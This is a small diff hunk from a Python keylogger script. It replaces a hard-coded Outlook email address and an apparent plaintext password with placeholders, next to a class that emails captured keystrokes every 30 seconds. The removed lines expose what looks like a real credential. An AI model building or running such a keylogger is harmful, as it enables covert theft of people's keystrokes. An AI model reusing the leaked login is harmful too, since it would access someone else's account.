@@ -10,8 +10,8 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 send_report_interval = 30
-email_address = "bluePhobic@outlook.com"
-email_password = "=SqbShv8N7c2C*)"
+email_address = "your_email"
+email_password = "your_password"
 
 class Keylogger: 
 	def __init__(self, interval, report_method="email"):
